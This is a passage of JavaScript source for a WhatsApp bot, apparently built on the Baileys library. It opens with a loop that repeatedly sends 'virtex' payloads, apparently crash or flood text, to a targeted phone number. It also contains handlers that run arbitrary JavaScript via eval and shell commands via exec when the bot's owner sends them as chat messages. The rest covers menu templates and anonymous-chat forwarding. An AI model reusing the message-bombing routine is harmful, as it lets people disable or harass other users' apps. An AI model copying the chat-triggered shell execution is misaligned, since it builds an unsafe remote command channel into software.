                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          }
          
          break




case '12345404menu': {
            	anu = ` 
            
  `
  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `${global.fake}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: 'YouTube📍',
                                    url: 'https://youtu.be/imFIX-Wrt3s'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${prefix}owner`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
break

case '12345energycontribution': case '12345tqtt': case '12345tqto': case '12345thanksto': case '12345thankto': 
m.reply(global.tqto)
break

//GET EMAIL TEMPORARY



 default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                      
                   }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		   if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.database
		    if (!(budy.toLowerCase() in msgs)) return
		   Pajrin.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
